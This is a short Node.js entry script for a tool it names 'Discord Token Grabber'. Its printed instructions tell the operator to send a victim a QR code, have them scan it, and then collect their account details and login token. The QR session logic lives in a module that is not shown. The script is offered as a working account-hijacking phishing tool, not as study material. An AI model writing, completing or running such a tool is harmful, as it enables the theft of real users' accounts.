const process = require('process');
const AuthSession = require('./qr-auth-session');
const { title, Spinner } = require('./util');

// Setup terminal
process.title = 'Discord Token Grabber';
console.log(title.red());
console.log('\nHow to use:');
console.log(' 1. The script will generate a image with a QR code');
console.log(' 2. Send the image to a victim and have them scan it');
console.log(' 3. Once they\'ve scanned it, you will recieve their id, username, avatar, and discriminator');
console.log(' 4. If they click the button to login, you will then recieve their token\n');

(async () => {
    await anyKey('Press any key to continue...');

    const session = new AuthSession();
})();

async function anyKey(text) {
    console.log(text);
    process.stdin.setRawMode(true);

    return new Promise((resolve) => {
        process.stdin.once('data', data => {
            process.stdin.setRawMode(false);

            if (data[0] == 0x03) process.exit();
            
            process.stdout.moveCursor(0, -1);
            process.stdout.clearLine();
            resolve();
        })
    })
}